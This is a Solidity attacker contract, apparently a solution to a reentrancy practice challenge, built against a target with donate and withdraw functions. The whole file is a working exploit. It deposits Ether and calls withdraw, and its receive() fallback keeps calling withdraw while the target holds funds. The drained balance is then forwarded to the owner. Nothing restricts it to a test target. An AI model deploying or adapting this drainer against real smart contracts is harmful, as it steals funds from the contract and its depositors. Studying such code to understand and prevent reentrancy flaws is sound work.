// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IReEntrancy {
    function prize() external view returns(uint);
    function donate(address _to) external payable;
    function withdraw(uint _amount) external;
}

contract ReEntryAttack {

    address owner;
    uint256 donatedAmount;
    IReEntrancy objective;

    constructor() {
        owner = msg.sender;
    }

    function DonateAndWithdraw(address objectiveAdress) external payable {
        require(msg.sender == owner, "Not the owner");
        objective = IReEntrancy(objectiveAdress);
        donatedAmount = msg.value;
        objective.donate{value: msg.value}(address(this));
        objective.withdraw(donatedAmount);
    }

    receive() external payable {
        if (address(objective).balance >= donatedAmount) {
            objective.withdraw(donatedAmount);
        }
    }

    function withdraw() external {
        require(msg.sender == owner, "Not the owner");
        (bool sent, ) = owner.call{value: address(this).balance}("");
        require(sent, "Failed to send Ether");
    }

}